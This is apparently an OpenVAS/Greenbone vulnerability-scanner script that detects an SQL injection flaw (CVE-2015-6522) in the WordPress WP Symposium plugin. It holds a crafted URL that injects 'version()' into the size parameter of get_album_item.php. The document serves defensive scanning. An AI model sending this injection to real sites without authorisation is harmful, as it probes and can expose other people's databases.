CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.806026" );
	script_version( "2020-02-26T12:57:19+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-02-26 12:57:19 +0000 (Wed, 26 Feb 2020)" );
	script_tag( name: "creation_date", value: "2015-08-24 15:13:35 +0530 (Mon, 24 Aug 2015)" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_name( "WordPress WP Symposium Multiple SQL Injection Vulnerabilities" );
	script_cve_id( "CVE-2015-6522" );
	script_tag( name: "summary", value: "The host is installed with WordPress
  WP Symposium plugin and is prone to multiple sql injection vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted request via HTTP GET and
  check whether it is able to execute sql query or not." );
	script_tag( name: "insight", value: "Multiple flaws are due to input validation
  errors in 'forum_functions.php' and 'get_album_item.php' in WP Symposium
  plugin." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attackers to inject or manipulate SQL queries in the back-end database,
  allowing for the manipulation or disclosure of arbitrary data." );
	script_tag( name: "affected", value: "WordPress WP Symposium Plugin version
  15.5.1 and probably all existing previous versions may also be affected." );
	script_tag( name: "solution", value: "Update to WP Symposium version 15.8 or
  later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/37824" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/37822" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "http://www.wpsymposium.com/" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
url = dir + "/wp-content/plugins/wp-symposium/get_album_item.php?size=version%28%29%20;%20--";
sndReq = http_get( item: url, port: http_port );
rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: "([0-9.]+)", extra_check: "Set-Cookie: PHPSESSID" )){
	security_message( port: http_port );
	exit( 0 );
}

